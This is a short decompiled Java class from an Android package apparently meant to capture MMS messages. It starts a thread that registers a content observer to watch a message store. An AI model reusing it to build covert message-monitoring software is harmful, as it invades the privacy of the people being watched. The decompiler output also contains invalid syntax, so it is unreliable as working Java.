package com.vvt.capture.mms.b;

import android.content.ContentResolver;
import android.database.ContentObserver;
import android.net.Uri;
import android.os.Handler;
import android.os.Looper;
import com.vvt.base.capture.i;

class c
  extends Thread
{
  c(b paramb, String paramString, i parami)
  {
    super(paramString);
  }
  
  public void run()
  {
    Looper.prepare();
    Object localObject1 = this.b;
    Object localObject2 = Looper.myLooper();
    b.a((b)localObject1, (Looper)localObject2);
    localObject1 = new android/os/Handler;
    ((Handler)localObject1).<init>();
    localObject2 = this.b;
    d locald = new com/vvt/capture/mms/b/d;
    locald.<init>(this, (Handler)localObject1);
    b.a((b)localObject2, locald);
    localObject1 = a.a;
    localObject2 = b.d(this.b);
    ContentObserver localContentObserver = b.c(this.b);
    ((ContentResolver)localObject2).registerContentObserver((Uri)localObject1, true, localContentObserver);
    Looper.loop();
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/mms/removeFromPath/MyUncaughtExceptionHandler.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */